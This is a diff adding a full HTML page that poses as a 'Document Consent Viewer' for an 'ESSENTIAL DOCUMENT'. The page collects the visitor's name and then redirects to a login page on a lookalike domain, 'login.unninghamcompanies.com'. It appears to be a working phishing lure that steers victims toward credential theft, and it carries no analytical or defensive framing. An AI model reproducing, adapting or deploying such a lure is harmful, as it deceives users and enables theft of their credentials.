@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Consent Viewer</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --error: #dc2626;
+            --text: #1f2937;
+            --text-secondary: #6b7280;
+            --border: #e5e7eb;
+            --danger-bg: #fee2e2;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-size: 16px;
+            line-height: 1.5;
+            color: var(--text);
+            background: white;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .container {
+            width: min(90%, 500px);
+            margin: 4rem auto 0;
+            padding: 0;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin-top: 2rem;
+            }
+        }
+        
+        .header {
+            font-size: 1.125rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-label {
+            display: block;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .required-mark {
+            color: var(--error);
+        }
+        
+        .form-input {
+            width: 100%;
+            height: 2.625rem;
+            padding: 0.625rem 0.9375rem;
+            border: 1px solid var(--border);
+            border-radius: 0.375rem;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
+        }
+        
+        .error-message {
+            color: var(--error);
+            font-size: 0.8125rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+        
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 0.375rem;
+            padding: 0.875rem 1.5rem;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            transition: opacity 0.2s;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .alert {
+            padding: 1rem 1.25rem;
+            border-radius: 0.375rem;
+            margin-bottom: 1.5rem;
+            display: none;
+        }
+        
+        .alert-danger {
+            background: var(--danger-bg);
+            color: var(--text);
+        }
+        
+        .spacer {
+            margin-top: 2.25rem;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="commonError" class="alert alert-danger hidden" role="alert"></div>
+        <span class="header">  ESSENTIAL DOCUMENT  .</span>
+        
+        <form id="consentForm" novalidate>
+            <div class="form-group">
+                <label for="name" class="form-label">
+                    <span class="required-mark" aria-hidden="true">*</span> 
+                    <span>Please enter your name to continue</span>
+                </label>
+                <input type="text" id="name" class="form-input" name="name" 
+                       placeholder="Your Name" autocomplete="name" required
+                       aria-required="true" aria-describedby="nameError">
+                <span id="nameError" class="error-message hidden" role="alert"></span>
+            </div>
+            
+            <div class="form-group spacer">
+                <button type="submit" id="submitBtn" class="btn" disabled>
+                    View
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        class ConsentForm {
+            constructor() {
+                this.elements = {
+                    form: document.getElementById('consentForm'),
+                    nameInput: document.getElementById('name'),
+                    nameError: document.getElementById('nameError'),
+                    submitBtn: document.getElementById('submitBtn'),
+                    commonError: document.getElementById('commonError')
+                };
+                
+                this.initialize();
+            }
+            
+            initialize() {
+                this.setupEventListeners();
+            }
+            
+            setupEventListeners() {
+                this.elements.nameInput.addEventListener('blur', () => this.validateName());
+                this.elements.nameInput.addEventListener('input', () => {
+                    if (this.elements.nameError.style.display === 'block') {
+                        this.validateName();
+                    }
+                    // Enable/disable button based on input
+                    this.toggleSubmitButton(this.elements.nameInput.value.trim().length > 1);
+                });
+                
+                this.elements.form.addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    this.handleSubmit();
+                });
+            }
+            
+            validateName() {
+                const name = this.elements.nameInput.value.trim();
+                
+                if (!name) {
+                    this.showError(this.elements.nameError, 'Name is required.');
+                    return false;
+                }
+                
+                if (name.length < 2) {
+                    this.showError(this.elements.nameError, 'Name must be at least 2 characters.');
+                    return false;
+                }
+                
+                this.hideError(this.elements.nameError);
+                return true;
+            }
+            
+            showError(element, message) {
+                element.textContent = message;
+                element.style.display = 'block';
+                this.toggleSubmitButton(false);
+            }
+            
+            hideError(element) {
+                element.textContent = '';
+                element.style.display = 'none';
+                this.toggleSubmitButton(true);
+            }
+            
+            toggleSubmitButton(enabled) {
+                this.elements.submitBtn.disabled = !enabled || 
+                    this.elements.nameInput.value.trim().length < 2;
+            }
+            
+            handleSubmit() {
+                if (this.validateName()) {
+                    
+                    window.location.href = "https://login.unninghamcompanies.com/c";
+                }
+            }
+        }
+        
+        // Initialize the form when DOM is loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            new ConsentForm();
+        });
+    </script>
+</body>
+</html>
